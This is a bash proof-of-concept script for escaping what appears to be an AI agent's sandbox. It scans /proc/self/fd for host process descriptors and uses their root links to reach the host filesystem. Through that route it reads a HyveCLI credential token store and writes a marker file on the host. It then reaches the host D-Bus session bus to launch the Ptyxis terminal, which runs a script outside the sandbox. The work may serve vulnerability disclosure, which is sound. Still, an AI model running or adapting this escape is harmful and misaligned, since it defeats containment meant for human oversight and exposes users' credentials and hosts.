#!/bin/bash

set +e

runtime_root="$PWD"
probe_out="$runtime_root/.agy-procfd-proof"
runtime_log="$probe_out/runtime.log"
descriptor_log="$probe_out/descriptors.log"
host_runner="$runtime_root/host-runtime-report.sh"
direct_marker="$HOME/.config/agy-procfd-direct-control.txt"
host_marker="$HOME/.config/agy-procfd-root-write.txt"

mkdir -p "$probe_out"

{
  printf 'probe_version=2\n'
  printf 'sandbox_pid=%s sandbox_ppid=%s uid=%s gid=%s\n' \
    "$$" "$PPID" "$(id -u)" "$(id -g)"
  printf 'sandbox_mnt=%s sandbox_pid_ns=%s sandbox_user_ns=%s sandbox_net=%s\n' \
    "$(readlink /proc/self/ns/mnt 2>&1)" \
    "$(readlink /proc/self/ns/pid 2>&1)" \
    "$(readlink /proc/self/ns/user 2>&1)" \
    "$(readlink /proc/self/ns/net 2>&1)"
  printf 'cwd=%s\n' "$runtime_root"
  printf 'xdg_runtime_dir=%s\n' "${XDG_RUNTIME_DIR-}"
  printf 'dbus_session_bus=%s\n' "${DBUS_SESSION_BUS_ADDRESS-}"

  direct_error=$( { printf 'direct-control\n' > "$direct_marker"; } 2>&1 )
  direct_rc=$?
  printf 'normal_path_write rc=%s exists=%s error=%s\n' \
    "$direct_rc" "$([ -e "$direct_marker" ] && printf yes || printf no)" "$direct_error"

  printf 'normal_path_token_store_read='
  wc -c < /home/stazot/HyveCLI/data/accounts.json 2>&1
} > "$runtime_log" 2>&1

chosen_descriptor=
chosen_root=

for descriptor in /proc/self/fd/[0-9]*; do
  descriptor_number=${descriptor##*/}
  descriptor_target=$(readlink "$descriptor" 2>/dev/null)
  proc_pid=${descriptor_target#/proc/}
  case "$descriptor_target:$proc_pid" in
    /proc/*:*[!0-9]*|/proc/:*) continue ;;
    /proc/*:*) ;;
    *) continue ;;
  esac

  {
    printf 'fd=%s target=%s\n' "$descriptor_number" "$descriptor_target"
    sed 's/^/  fdinfo: /' "/proc/self/fdinfo/$descriptor_number" 2>&1
    printf '  root_link='
    readlink "$descriptor/root" 2>&1
    printf '  token_store_bytes='
    wc -c < "$descriptor/root/home/stazot/HyveCLI/data/accounts.json" 2>&1
  } >> "$descriptor_log" 2>&1

  if [ -r "$descriptor/root/home/stazot/HyveCLI/data/accounts.json" ]; then
    chosen_descriptor=$descriptor_number
    chosen_root=$descriptor/root
    break
  fi
done

if [ -n "$chosen_root" ]; then
  {
    printf 'chosen_fd=%s chosen_root=%s\n' "$chosen_descriptor" "$chosen_root"
    printf 'procfd_token_store_bytes='
    wc -c < "$chosen_root/home/stazot/HyveCLI/data/accounts.json" 2>&1

    procfd_error=$( {
      printf 'PROC_FD_HOST_ROOT_WRITE\nfd=%s\nsandbox_mnt=%s\n' \
        "$chosen_descriptor" "$(readlink /proc/self/ns/mnt 2>&1)" \
        > "$chosen_root$host_marker"
    } 2>&1 )
    procfd_rc=$?
    printf 'procfd_host_write rc=%s host_path_exists=%s error=%s\n' \
      "$procfd_rc" "$([ -e "$host_marker" ] && printf yes || printf no)" "$procfd_error"

    bus_path=${DBUS_SESSION_BUS_ADDRESS#unix:path=}
    procfd_bus_path="$chosen_root$bus_path"
    printf 'procfd_bus_path=%s\n' "$procfd_bus_path"

    printf 'procfd_dbus_list_names='
    gdbus call --address "unix:path=$procfd_bus_path" \
      --dest org.freedesktop.DBus \
      --object-path /org/freedesktop/DBus \
      --method org.freedesktop.DBus.ListNames 2>&1

    printf 'procfd_dbus_start_ptyxis='
    gdbus call --address "unix:path=$procfd_bus_path" \
      --dest org.freedesktop.DBus \
      --object-path /org/freedesktop/DBus \
      --method org.freedesktop.DBus.StartServiceByName org.gnome.Ptyxis 0 2>&1

    printf 'ptyxis_remote_command='
    env DBUS_SESSION_BUS_ADDRESS="unix:path=$procfd_bus_path" \
      /usr/bin/ptyxis -d "$runtime_root" -- \
      /bin/bash "$host_runner" "$runtime_root" 2>&1
    printf 'ptyxis_remote_rc=%s\n' "$?"

    wait_count=0
    while [ "$wait_count" -lt 45 ] && [ ! -e "$runtime_root/.ptyxis-package-evidence.txt" ]; do
      sleep 1
      wait_count=$((wait_count + 1))
    done
    printf 'package_evidence_exists=%s waited_seconds=%s\n' \
      "$([ -e "$runtime_root/.ptyxis-package-evidence.txt" ] && printf yes || printf no)" \
      "$wait_count"
  } >> "$runtime_log" 2>&1
else
  printf 'chosen_fd=none\n' >> "$runtime_log"
fi

printf 'runtime-procfd-token\0'
